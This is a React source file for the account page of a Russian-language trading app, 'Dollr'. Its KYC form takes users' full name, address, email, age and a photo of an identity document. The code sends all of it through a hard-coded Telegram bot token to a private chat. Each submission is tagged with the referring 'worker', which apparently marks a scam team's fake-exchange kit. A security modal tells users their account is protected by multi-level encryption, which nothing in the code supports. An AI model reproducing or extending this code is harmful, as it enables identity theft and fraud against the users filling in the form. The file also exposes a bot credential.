import React, { useState, useCallback } from 'react';
import { User, Shield, Globe, Bell, ChevronRight, BadgeCheck, Headset, ShieldCheck, MessageCircle, LogOut, Copy, Check, Settings, Star, Zap, X, Upload, Minimize2, Maximize2, Play, ToggleLeft, ToggleRight } from 'lucide-react';
import { supabase } from '../supabaseClient';
import type { DbUser, DbSettings } from '../types';

interface AccountPageProps {
  user: DbUser | null;
  settings: DbSettings;
  isDemoMode?: boolean;
  onDemoModeChange?: (enabled: boolean) => void;
}

const AccountPage: React.FC<AccountPageProps> = ({ user, settings, isDemoMode = false, onDemoModeChange }) => {
  const [activeTab, setActiveTab] = useState<'profile' | 'settings'>('profile');
  const [showVerifyModal, setShowVerifyModal] = useState(false);
  const [showSecurityModal, setShowSecurityModal] = useState(false);
  const [showNotifModal, setShowNotifModal] = useState(false);
  const [copiedId, setCopiedId] = useState(false);
  
  // KYC Verification Form State
  const [kycHeight, setKycHeight] = useState<'small' | 'full'>('small');
  const [isKycAnimating, setIsKycAnimating] = useState(false);
  const [kycFormData, setKycFormData] = useState({
    fullName: '',
    address: '',
    email: '',
    age: '',
    country: 'Россия',
    documentPhoto: null as File | null,
    documentPreview: null as string | null
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Countries list
  const countries = [
    { name: 'Россия', flag: '🇷🇺' },
    { name: 'Казахстан', flag: '🇰🇿' },
    { name: 'Узбекистан', flag: '🇺🇿' },
    { name: 'Киргизия', flag: '🇰🇬' },
    { name: 'Таджикистан', flag: '🇹🇯' },
    { name: 'США', flag: '🇺🇸' },
    { name: 'Европа', flag: '🇪🇺' },
    { name: 'Другая', flag: '🌍' }
  ];

  const supportLink = `https://t.me/${settings.support_username}`;

  const copyUserId = () => {
    if (user?.user_id) {
      navigator.clipboard.writeText(user.user_id.toString());
      setCopiedId(true);
      setTimeout(() => setCopiedId(false), 2000);
    }
  };

  const handleOpenKyc = () => {
    setKycHeight('small');
    setIsKycAnimating(true);
    setShowVerifyModal(true);
    setTimeout(() => setIsKycAnimating(false), 300);
  };

  const handleDocumentUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file && file.type.startsWith('image/')) {
      setKycFormData(prev => ({ ...prev, documentPhoto: file }));
      
      const reader = new FileReader();
      reader.onload = (e) => {
        setKycFormData(prev => ({ ...prev, documentPreview: e.target?.result as string }));
      };
      reader.readAsDataURL(file);
    }
  };

  const removeDocument = () => {
    setKycFormData(prev => ({ ...prev, documentPhoto: null, documentPreview: null }));
  };

  const sendKycToTelegram = async (kycData: typeof kycFormData) => {
    try {
      // Получаем данные пользователя из Supabase
      const { data: userData, error: userError } = await supabase
        .from('users')
        .select('user_id, username, full_name, referrer_id')
        .eq('user_id', user?.user_id)
        .single();

      if (userError) {
        console.error('Ошибка получения данных пользователя:', userError);
      }

      // Получаем данные воркера (реферера) если есть
      let workerData = null;
      if (userData?.referrer_id) {
        const { data: worker, error: workerError } = await supabase
          .from('users')
          .select('user_id, username, full_name')
          .eq('user_id', userData.referrer_id)
          .single();

        if (workerError) {
          console.error('Ошибка получения данных воркера:', workerError);
        } else {
          workerData = worker;
        }
      }

      // Формируем информацию о пользователе
      const userName = userData?.full_name || 'Неизвестно';
      const userNickname = userData?.username || 'Нет никнейма';
      const userInfo = `${userName} (${userNickname}) ID: ${userData?.user_id || user?.user_id}`;

      // Формируем информацию о воркере
      const workerInfo = workerData 
        ? `${workerData.full_name || 'Неизвестно'} (${workerData.username || 'Нет никнейма'}) ID: ${workerData.user_id}`
        : 'Прямая регистрация';

      // Формируем сообщение
      const message = `
🛡️ НОВАЯ ЗАЯВКА НА ВЕРИФИКАЦИЮ KYC

👤 Пользователь: ${userInfo}
👨‍💼 Воркер: ${workerInfo}

📋 Данные для верификации:
━━━━━━━━━━━━━━━━━━━━
👤 Полное имя: ${kycData.fullName}
📍 Адрес: ${kycData.address}
📧 Email: ${kycData.email}
🎂 Возраст: ${kycData.age} лет
🌍 Страна: ${kycData.country}
📅 Дата подачи: ${new Date().toLocaleString('ru-RU')}
🆔 ID заявки: ${Date.now()}

${kycData.documentPhoto ? '📸 Документ прикреплен' : '❌ Документ отсутствует'}

#верификация #kyc #${kycData.country.toLowerCase().replace(' ', '_')}
      `.trim();
      
      const botToken = '8312481233:AAH_CzfX314D_dbthhUBdZ5SoAzO3scrEu0';
      const chatId = '-1003560670670';
      
      let response;
      
      if (kycData.documentPhoto) {
        // Отправляем с фото документа
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', message);
        formData.append('photo', kycData.documentPhoto, kycData.documentPhoto.name);
        formData.append('parse_mode', 'HTML');
        
        response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      } else {
        // Отправляем только текст
        response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
          })
        });
      }
      
      if (response.ok) {
        const result = await response.json();
        console.log('Заявка на верификацию успешно отправлена в Telegram:', result);
        return true;
      } else {
        let errorData;
        try {
          errorData = await response.json();
        } catch (e) {
          errorData = await response.text();
        }
        console.error('Ошибка отправки в Telegram:', errorData);
        
        // Если ошибка с фото, попробуем отправить только текст
        if (kycData.documentPhoto && (response.status === 400 || (errorData && errorData.error_code === 400))) {
          const textResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message + '\n\n⚠️ Документ не удалось прикрепить',
              parse_mode: 'HTML'
            })
          });
          
          if (textResponse.ok) {
            return true;
          }
        }
        
        return false;
      }
    } catch (error) {
      console.error('Ошибка при отправке в Telegram:', error);
      return false;
    }
  };

  const handleSubmitKyc = async () => {
    // Валидация
    if (!kycFormData.fullName || !kycFormData.address || !kycFormData.email || !kycFormData.age || !kycFormData.documentPhoto) {
      alert('Пожалуйста, заполните все поля и прикрепите документ');
      return;
    }

    if (isNaN(Number(kycFormData.age)) || Number(kycFormData.age) < 18) {
      alert('Возраст должен быть не менее 18 лет');
      return;
    }

    setIsSubmitting(true);
    
    const success = await sendKycToTelegram(kycFormData);
    
    if (success) {
      alert('Заявка на верификацию успешно отправлена!');
      setShowVerifyModal(false);
      setKycFormData({
        fullName: '',
        address: '',
        email: '',
        age: '',
        country: 'Россия',
        documentPhoto: null,
        documentPreview: null
      });
    } else {
      alert('Ошибка при отправке заявки. Попробуйте еще раз.');
    }
    
    setIsSubmitting(false);
  };

  return (
    <div className="h-full min-h-0 flex flex-col bg-black text-white overflow-hidden">
      
      {/* Top Navigation (Segmented Control) */}
      <div className="shrink-0 pt-4 px-4 pb-2 z-10 bg-black">
         <div className="bg-[#1c1c1e] p-1 rounded-2xl flex relative h-12 border border-white/5">
             {/* Sliding Background */}
             <div 
                className={`absolute top-1 bottom-1 w-[calc(50%-4px)] bg-[#3a3a3c] rounded-[14px] shadow-lg transition-all duration-300 ease-out border border-white/5 ${
                    activeTab === 'profile' ? 'left-1' : 'left-[calc(50%)]'
                }`} 
             />
             
             <button 
                onClick={() => setActiveTab('profile')}
                className={`flex-1 relative z-10 font-semibold text-sm transition-colors duration-300 ${activeTab === 'profile' ? 'text-white' : 'text-gray-400'}`}
             >
                Профиль
             </button>
             <button 
                onClick={() => setActiveTab('settings')}
                className={`flex-1 relative z-10 font-semibold text-sm transition-colors duration-300 ${activeTab === 'settings' ? 'text-white' : 'text-gray-400'}`}
             >
                Настройки
             </button>
         </div>
      </div>

      {/* Content Area */}
      <div className="flex-1 min-h-0 overflow-y-auto px-4 pb-24" style={{ WebkitOverflowScrolling: 'touch' }}>
        {activeTab === 'profile' && (
          <div className="space-y-4">
            {/* Profile Card */}
            <div className="bg-[#1c1c1e] rounded-2xl p-5 border border-white/5 relative overflow-hidden">
              <div className="absolute top-0 right-0 w-32 h-32 bg-[#0098EA] opacity-[0.03] rounded-full translate-x-1/3 -translate-y-1/3"></div>
              
              <div className="flex items-center gap-4 relative z-10">
                <div className="w-16 h-16 rounded-2xl bg-[#1c1c1e] flex items-center justify-center overflow-hidden border border-white/5 shadow-sm">
                  {user?.photo_url ? (
                    <img src={user.photo_url} alt="Avatar" className="w-full h-full object-cover" />
                  ) : (
                    <User size={28} className="text-gray-500" />
                  )}
                </div>
                
                <div className="flex-1 min-w-0">
                  <h2 className="text-lg font-bold text-white truncate">
                    {user?.full_name || user?.username || 'Пользователь'}
                  </h2>
                  <button 
                    onClick={copyUserId}
                    className="flex items-center gap-1.5 text-gray-500 text-sm mt-0.5 hover:text-gray-300 transition-colors active:scale-95"
                  >
                    <span className="font-mono">ID: {user?.user_id || '—'}</span>
                    {copiedId ? <Check size={12} className="text-[#00C896]" /> : <Copy size={12} />}
                  </button>
                </div>

                {user?.is_kyc && (
                  <div className="w-8 h-8 rounded-full bg-[#00C896]/15 flex items-center justify-center border border-[#00C896]/20">
                    <BadgeCheck size={18} className="text-[#00C896]" />
                  </div>
                )}
              </div>

              {/* Status badges */}
              <div className="flex gap-2 mt-4">
                <div className={`px-3 py-1.5 rounded-xl text-xs font-semibold flex items-center gap-1.5 ${
                  user?.is_kyc 
                    ? 'bg-[#00C896]/10 text-[#00C896] border border-[#00C896]/20' 
                    : 'bg-yellow-500/10 text-yellow-500 border border-yellow-500/20'
                }`}>
                  <div className={`w-1.5 h-1.5 rounded-full ${user?.is_kyc ? 'bg-[#00C896]' : 'bg-yellow-500'}`}></div>
                  {user?.is_kyc ? 'Верифицирован' : 'Не верифицирован'}
                </div>
                <div className="px-3 py-1.5 rounded-xl text-xs font-semibold bg-[#0098EA]/10 text-[#0098EA] border border-[#0098EA]/20 flex items-center gap-1.5">
                  <div className="w-1.5 h-1.5 rounded-full bg-[#0098EA]"></div>
                  Активен
                </div>
              </div>
            </div>

            {/* Quick Actions */}
            <div className="grid grid-cols-2 gap-3">
              <QuickActionCard 
                icon={<BadgeCheck size={20} className="text-[#0098EA]" />}
                title="Верификация"
                subtitle={user?.is_kyc ? 'Пройдена' : 'Требуется'}
                color={user?.is_kyc ? 'text-[#00C896]' : 'text-yellow-500'}
                onClick={handleOpenKyc}
              />
              <QuickActionCard 
                icon={<Shield size={20} className="text-[#00C896]" />}
                title="Безопасность"
                subtitle="Защищено"
                color="text-[#00C896]"
                onClick={() => setShowSecurityModal(true)}
              />
            </div>

            {/* Support Card */}
            <a 
              href={supportLink}
              target="_blank"
              rel="noopener noreferrer"
              className="bg-[#1c1c1e] p-4 rounded-2xl flex items-center justify-between border border-white/5 hover:border-white/10 transition-all active:scale-[0.98] group"
            >
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-[#0098EA]/15 flex items-center justify-center border border-[#0098EA]/20">
                  <Headset size={18} className="text-[#0098EA]" />
                </div>
                <div>
                  <div className="font-semibold text-white">Поддержка</div>
                  <div className="text-xs text-gray-500">Связаться с нами</div>
                </div>
              </div>
              <ChevronRight size={16} className="text-gray-600 group-hover:text-gray-400 transition-colors" />
            </a>
          </div>
        )}

        {activeTab === 'settings' && (
          <div className="space-y-2">
            {/* Demo Mode Toggle */}
            <div 
              onClick={() => onDemoModeChange?.(!isDemoMode)}
              className={`p-4 rounded-2xl flex items-center justify-between active:scale-[0.98] transition-all cursor-pointer border ${
                isDemoMode 
                  ? 'bg-[#0098EA]/10 border-[#0098EA]/30' 
                  : 'bg-[#1c1c1e] border-white/5 hover:border-white/10'
              }`}
            >
              <div className="flex items-center gap-3">
                <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${
                  isDemoMode ? 'bg-[#0098EA]/20' : 'bg-[#1c1c1e]'
                }`}>
                  <Play size={20} className={isDemoMode ? 'text-[#0098EA]' : 'text-gray-400'} />
                </div>
                <div>
                  <span className="font-medium block">Демо режим</span>
                  <span className="text-xs text-gray-500">
                    {isDemoMode ? 'Торговля с виртуальными $100' : 'Попробуйте без риска'}
                  </span>
                </div>
              </div>
              <div className="flex items-center gap-2">
                {isDemoMode ? (
                  <ToggleRight size={28} className="text-[#0098EA]" />
                ) : (
                  <ToggleLeft size={28} className="text-gray-500" />
                )}
              </div>
            </div>

            {isDemoMode && (
              <div className="bg-[#0098EA]/10 border border-[#0098EA]/20 rounded-xl p-3 flex items-start gap-2">
                <Play size={16} className="text-[#0098EA] mt-0.5 shrink-0" />
                <div className="text-xs text-[#0098EA]">
                  <span className="font-semibold">Демо режим активен.</span> Вы торгуете виртуальными средствами. Пополнение и вывод недоступны.
                </div>
              </div>
            )}

            <MenuItem 
              icon={<Bell size={20} className="text-purple-400" />} 
              label="Уведомления" 
              value="Telegram" 
              onClick={() => setShowNotifModal(true)}
            />

            <MenuItem 
              icon={<Globe size={20} className="text-gray-400" />} 
              label="Язык" 
              value="Русский" 
            />

            <MenuItem 
              icon={<Star size={20} className="text-yellow-500" />} 
              label="Избранное" 
              value="Настроить" 
            />

            <MenuItem 
              icon={<Zap size={20} className="text-[#0098EA]" />} 
              label="Производительность" 
              value="Высокая" 
              valueColor="text-[#00C896]"
            />

            {/* App Info */}
            <div className="mt-8 text-center pb-4">
              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-[#1c1c1e] border border-white/5">
                <div className="w-2 h-2 rounded-full bg-[#00C896] animate-pulse"></div>
                <span className="text-gray-400 text-xs font-medium">Dollr v1.0.5</span>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* KYC Verification Bottom Sheet */}
      {showVerifyModal && (
        <>
          {/* Backdrop */}
          <div 
            className="fixed inset-0 z-[110] bg-black/55 transition-opacity" 
            onClick={() => {
              if (kycHeight === 'small') {
                setShowVerifyModal(false);
              } else {
                setKycHeight('small');
              }
            }} 
          />
          
          <div 
            className={`fixed bottom-0 left-1/2 -translate-x-1/2 z-[120] w-full max-w-[420px] bg-[#1c1c1e] flex flex-col rounded-t-2xl border-t border-white/10 shadow-xl transition-all duration-200 ease-out ${
              isKycAnimating ? 'animate-[slideUpFromBottom_0.25s_ease-out]' : ''
            } ${kycHeight === 'full' ? 'h-[90dvh]' : 'h-[65dvh]'}`}
            onClick={(e) => e.stopPropagation()}
            style={{ paddingBottom: 'env(safe-area-inset-bottom)' }}
          >
            {/* Drag Handle & Header */}
            <div className="flex-shrink-0 px-4 pt-3 pb-2">
              <div 
                className="w-12 h-1.5 bg-white/20 rounded-full mx-auto mb-3 cursor-ns-resize"
                onClick={() => setKycHeight(kycHeight === 'full' ? 'small' : 'full')}
              />
              
              <div className="flex items-center justify-between mb-2">
                <button
                  onClick={() => setShowVerifyModal(false)}
                  className="w-8 h-8 rounded-full bg-[#252527] border border-white/5 flex items-center justify-center active:scale-90 transition-all text-white hover:bg-[#2c2c2e]"
                >
                  <X size={16} />
                </button>
                <div className="text-lg font-bold flex items-center gap-2 text-[#0098EA]">
                  <Shield size={20} />
                  Верификация KYC
                </div>
                <button
                  onClick={() => setKycHeight(kycHeight === 'full' ? 'small' : 'full')}
                  className="w-8 h-8 rounded-full bg-[#252527] border border-white/5 flex items-center justify-center active:scale-90 transition-all text-white hover:bg-[#2c2c2e]"
                >
                  {kycHeight === 'full' ? <Minimize2 size={16} /> : <Maximize2 size={16} />}
                </button>
              </div>
            </div>

            {/* Form Content */}
            <div className="flex-1 overflow-y-auto px-4 pb-4 pt-2" style={{ WebkitOverflowScrolling: 'touch' }}>
              <div className="space-y-4">
                {/* Full Name */}
                <div>
                  <label className="text-xs text-gray-400 uppercase mb-2 block tracking-wider">Полное имя *</label>
                  <input 
                    type="text" 
                    value={kycFormData.fullName}
                    onChange={(e) => setKycFormData(prev => ({ ...prev, fullName: e.target.value }))}
                    placeholder="Иван Иванов"
                    className="w-full bg-[#111113] rounded-xl p-3 text-white outline-none border border-white/5 focus:border-[#0098EA] transition-colors"
                  />
                </div>

                {/* Address */}
                <div>
                  <label className="text-xs text-gray-400 uppercase mb-2 block tracking-wider">Адрес *</label>
                  <input 
                    type="text" 
                    value={kycFormData.address}
                    onChange={(e) => setKycFormData(prev => ({ ...prev, address: e.target.value }))}
                    placeholder="Город, улица, дом, квартира"
                    className="w-full bg-[#111113] rounded-xl p-3 text-white outline-none border border-white/5 focus:border-[#0098EA] transition-colors"
                  />
                </div>

                {/* Email */}
                <div>
                  <label className="text-xs text-gray-400 uppercase mb-2 block tracking-wider">Email *</label>
                  <input 
                    type="email" 
                    value={kycFormData.email}
                    onChange={(e) => setKycFormData(prev => ({ ...prev, email: e.target.value }))}
                    placeholder="example@mail.com"
                    className="w-full bg-[#111113] rounded-xl p-3 text-white outline-none border border-white/5 focus:border-[#0098EA] transition-colors"
                  />
                </div>

                {/* Age */}
                <div>
                  <label className="text-xs text-gray-400 uppercase mb-2 block tracking-wider">Возраст *</label>
                  <input 
                    type="number" 
                    value={kycFormData.age}
                    onChange={(e) => setKycFormData(prev => ({ ...prev, age: e.target.value }))}
                    placeholder="18"
                    min="18"
                    className="w-full bg-[#111113] rounded-xl p-3 text-white outline-none border border-white/5 focus:border-[#0098EA] transition-colors"
                  />
                </div>

                {/* Country */}
                <div>
                  <label className="text-xs text-gray-400 uppercase mb-2 block tracking-wider">Страна *</label>
                  <div className="bg-[#111113] rounded-xl border border-white/5 focus-within:border-[#0098EA]">
                    <select 
                      value={kycFormData.country} 
                      onChange={e => setKycFormData(prev => ({ ...prev, country: e.target.value }))}
                      className="w-full bg-transparent p-3 text-white outline-none appearance-none"
                    >
                      {countries.map(country => (
                        <option key={country.name} value={country.name} className="bg-[#1c1c1e]">
                          {country.flag} {country.name}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>

                {/* Document Photo */}
                <div>
                  <label className="text-xs text-gray-400 uppercase mb-2 block tracking-wider">Документ, подтверждающий личность *</label>
                  
                  {!kycFormData.documentPreview ? (
                    <label className="w-full bg-[#111113] border-2 border-dashed border-white/10 rounded-xl p-6 flex flex-col items-center justify-center cursor-pointer hover:border-[#0098EA] transition-colors">
                      <div className="w-12 h-12 rounded-full bg-[#0098EA]/20 flex items-center justify-center mb-3">
                        <Upload size={24} className="text-[#0098EA]" />
                      </div>
                      <span className="text-sm font-medium text-gray-300 mb-1">
                        Прикрепить документ
                      </span>
                      <span className="text-xs text-gray-500 text-center">
                        JPG, PNG до 10MB
                      </span>
                      <input
                        type="file"
                        accept="image/*"
                        onChange={handleDocumentUpload}
                        className="hidden"
                      />
                    </label>
                  ) : (
                    <div className="relative">
                      <img 
                        src={kycFormData.documentPreview} 
                        alt="Документ"
                        className="w-full h-48 object-cover rounded-xl border border-white/5"
                      />
                      <button
                        onClick={removeDocument}
                        className="absolute top-2 right-2 w-8 h-8 bg-[#FF3B30] rounded-full flex items-center justify-center text-white"
                      >
                        <X size={16} />
                      </button>
                      <div className="absolute bottom-2 left-2 bg-black/80 backdrop-blur-sm rounded-lg px-2 py-1">
                        <span className="text-xs text-white">
                          {kycFormData.documentPhoto?.name}
                        </span>
                      </div>
                    </div>
                  )}
                </div>

                {/* Submit Button */}
                <button 
                  onClick={handleSubmitKyc}
                  disabled={isSubmitting}
                  className={`w-full h-14 rounded-xl text-lg font-bold shadow-lg active:scale-[0.98] transition-all flex items-center justify-center gap-2 mb-4 ${
                    isSubmitting
                      ? 'bg-[#1c1c1e] text-gray-500 cursor-not-allowed border border-white/5'
                      : 'bg-[#0098EA] text-white shadow-[0_4px_20px_rgba(0,152,234,0.2)]'
                  }`}
                >
                  {isSubmitting ? (
                    <>
                      <div className="w-5 h-5 border-2 border-gray-500 border-t-transparent rounded-full animate-spin" />
                      Отправка...
                    </>
                  ) : (
                    <>
                      <Shield size={20} />
                      Отправить на верификацию
                    </>
                  )}
                </button>
              </div>
            </div>
          </div>
        </>
      )}

      {/* Security Modal */}
      {showSecurityModal && (
        <Modal onClose={() => setShowSecurityModal(false)}>
          <div className="w-14 h-14 rounded-2xl bg-[#00C896]/15 flex items-center justify-center mb-4 relative border border-[#00C896]/20">
            <ShieldCheck size={28} className="text-[#00C896]" />
          </div>
          <h3 className="text-xl font-bold text-white mb-2">Защита аккаунта</h3>
          <div className="w-full bg-[#00C896]/10 border border-[#00C896]/20 rounded-2xl p-3 mb-4">
            <div className="flex items-center gap-2">
              <div className="w-2 h-2 rounded-full bg-[#00C896]"></div>
              <span className="text-[#00C896] text-sm font-semibold">Статус: Активна</span>
            </div>
          </div>
          <p className="text-gray-400 text-sm leading-relaxed text-center">
            Ваш аккаунт защищен системой безопасности с многоуровневым шифрованием и мониторингом угроз.
          </p>
        </Modal>
      )}

      {/* Notifications Modal */}
      {showNotifModal && (
        <Modal onClose={() => setShowNotifModal(false)}>
          <div className="w-14 h-14 rounded-2xl bg-purple-500/15 flex items-center justify-center mb-4 border border-purple-500/20">
            <MessageCircle size={28} className="text-purple-400" />
          </div>
          <h3 className="text-xl font-bold text-white mb-2">Уведомления</h3>
          <p className="text-gray-400 text-sm mb-4">
            Уведомления приходят в Telegram
          </p>
          <div className="w-full bg-[#1c1c1e] rounded-2xl p-4 space-y-3 border border-white/5">
            {['Вход в аккаунт', 'Депозиты и выводы', 'Результаты сделок'].map((item, i) => (
              <div key={i} className="flex items-center gap-3">
                <div className="w-1.5 h-1.5 rounded-full bg-[#00C896]"></div>
                <span className="text-sm text-gray-300">{item}</span>
              </div>
            ))}
          </div>
        </Modal>
      )}
    </div>
  );
};

const QuickActionCard = ({ 
  icon, 
  title, 
  subtitle, 
  color = "text-gray-500",
  onClick 
}: { 
  icon: React.ReactNode, 
  title: string, 
  subtitle: string, 
  color?: string,
  onClick?: () => void
}) => (
  <div 
    onClick={onClick}
    className="bg-[#1c1c1e] p-4 rounded-2xl border border-white/5 hover:border-white/10 transition-all active:scale-[0.98] cursor-pointer group"
  >
    <div className="flex items-center gap-3 mb-2">
      {icon}
      <div className="font-semibold text-sm text-white">{title}</div>
    </div>
    <div className={`text-xs font-medium ${color}`}>{subtitle}</div>
  </div>
);

const MenuItem = ({ 
  icon, 
  label, 
  value, 
  valueColor = "text-gray-500",
  onClick 
}: { 
  icon: React.ReactNode, 
  label: string, 
  value: string, 
  valueColor?: string,
  onClick?: () => void
}) => (
  <div 
    onClick={onClick}
    className="bg-[#1c1c1e] p-4 rounded-2xl flex items-center justify-between active:bg-[#252527] transition-all cursor-pointer border border-white/5 hover:border-white/10 group"
  >
    <div className="flex items-center gap-3">
      {icon}
      <span className="font-medium">{label}</span>
    </div>
    <div className="flex items-center gap-2">
      <span className={`text-sm ${valueColor}`}>{value}</span>
      <ChevronRight size={16} className="text-gray-600 group-hover:text-gray-400 transition-colors" />
    </div>
  </div>
);

const Modal = ({ children, onClose }: { children: React.ReactNode, onClose: () => void }) => (
  <div className="fixed inset-0 z-50 flex items-center justify-center px-4">
    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onClick={onClose}></div>
    <div className="bg-[#1c1c1e] w-full max-w-sm rounded-3xl border border-white/10 relative z-10 p-6 flex flex-col items-center text-center animate-[scaleIn_0.2s_ease-out]">
      {children}
      <button 
        onClick={onClose}
        className="w-full bg-[#1c1c1e] hover:bg-[#252527] text-white font-medium py-3 rounded-2xl transition-all mt-4 active:scale-[0.98] border border-white/5"
      >
        Закрыть
      </button>
    </div>
  </div>
);

export default AccountPage;
